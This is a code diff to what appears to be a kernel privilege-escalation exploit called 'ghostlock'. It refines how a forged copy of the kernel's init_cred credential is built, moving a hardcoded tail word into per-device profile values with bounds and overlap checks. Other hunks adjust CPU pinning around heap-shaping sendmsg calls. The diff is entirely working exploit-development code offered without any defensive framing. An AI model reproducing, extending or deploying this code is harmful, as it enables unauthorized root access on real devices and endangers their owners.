@@ -225,10 +225,45 @@ namespace ghostlock::support {
             put64(c, ref_offsets[i],
                   session::g_exploit_session.addresses.data_alias(ref_images[i]));
         }
-        /* Faithful copy of this kernel's init_cred tail: the word at 0xa8 holds
-         * a small refcount (2 in the image dump). Leaving it zero made the copy
-         * diverge from the real credential. */
-        if (v->credential.copy_size > 0xa8) put64(c, 0xa8, 2);
+
+        /* Device-specific tail word. It must be an explicit profile value: the
+         * old hardcoded 0xa8/2 write could overwrite another configured field
+         * and its eight-byte store went past copy_size for sizes 169..175. */
+        const bool has_tail_offset = v->credential.tail_offset.has_value();
+        const bool has_tail_value = v->credential.tail_value.has_value();
+        if (has_tail_offset != has_tail_value) {
+            pr_error("credential tail requires both tail_offset and tail_value\n");
+            return 0;
+        }
+        if (has_tail_offset) {
+            const uint64_t tail_offset = *v->credential.tail_offset;
+            if (tail_offset > v->credential.copy_size ||
+                sizeof(uint64_t) >
+                    static_cast<uint64_t>(v->credential.copy_size) - tail_offset) {
+                pr_error("credential tail exceeds configured copy size\n");
+                return 0;
+            }
+            const uint64_t tail_end = tail_offset + sizeof(uint64_t);
+            const auto overlaps = [tail_offset, tail_end](uint64_t offset,
+                                                          uint64_t length) {
+                return offset < tail_end && tail_offset < offset + length;
+            };
+            if (overlaps(v->credential.usage_offset, sizeof(uint32_t)) ||
+                overlaps(v->credential.caps_offset,
+                         static_cast<uint64_t>(v->credential.caps_count) *
+                             sizeof(uint64_t))) {
+                pr_error("credential tail overlaps usage or capabilities\n");
+                return 0;
+            }
+            for (size_t i = 0; i < v->credential.ref_count; i++) {
+                if (overlaps(ref_offsets[i], sizeof(uint64_t))) {
+                    pr_error("credential tail overlaps reference %zu\n", i);
+                    return 0;
+                }
+            }
+            put64(c, static_cast<size_t>(tail_offset),
+                  *v->credential.tail_value);
+        }
         return 1;
     }
 
@@ -239,7 +274,8 @@ namespace ghostlock::support {
             if (getppid() == 1) {
                 _exit(0);
             }
-            kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
+            (void) kernel::pin_to_core(
+                static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
             for (;;) {
                 pause();
             }
@@ -653,7 +689,8 @@ namespace ghostlock::support {
 
         SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
+        (void) kernel::pin_to_core(
+            static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         sched_yield();
         sched_yield();
         sched_yield();
